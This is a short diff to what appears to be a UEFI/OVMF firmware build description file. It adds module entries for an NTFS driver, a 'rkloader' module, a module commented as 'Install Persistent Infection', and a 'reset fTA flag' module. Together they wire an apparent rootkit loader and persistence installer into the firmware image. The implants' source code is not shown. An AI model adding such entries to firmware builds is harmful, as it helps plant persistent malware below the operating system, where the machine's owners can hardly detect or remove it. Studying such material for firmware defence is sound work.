@@ -324,6 +324,18 @@ INF  RuleOverride=ACPITABLE OvmfPkg/AcpiTables/AcpiTables.inf
 INF  OvmfPkg/AcpiS3SaveDxe/AcpiS3SaveDxe.inf
 INF  MdeModulePkg/Universal/Acpi/S3SaveStateDxe/S3SaveStateDxe.inf
 INF  MdeModulePkg/Universal/Acpi/BootScriptExecutorDxe/BootScriptExecutorDxe.inf
+INF	 NtfsPkg/NtfsDxe/Ntfs.inf
+INF  rkloader/rkloader.inf
+
+#
+#  Install Persistent Infection
+#
+INF MdeModulePkg/Application/fsbg/fsbg.inf
+
+#
+# reset fTA flag
+#
+INF MdeModulePkg/Application/ReSetfTA/ReSetfTA.inf
 
 INF  RuleOverride = BINARY FatBinPkg/EnhancedFatDxe/Fat.inf
 
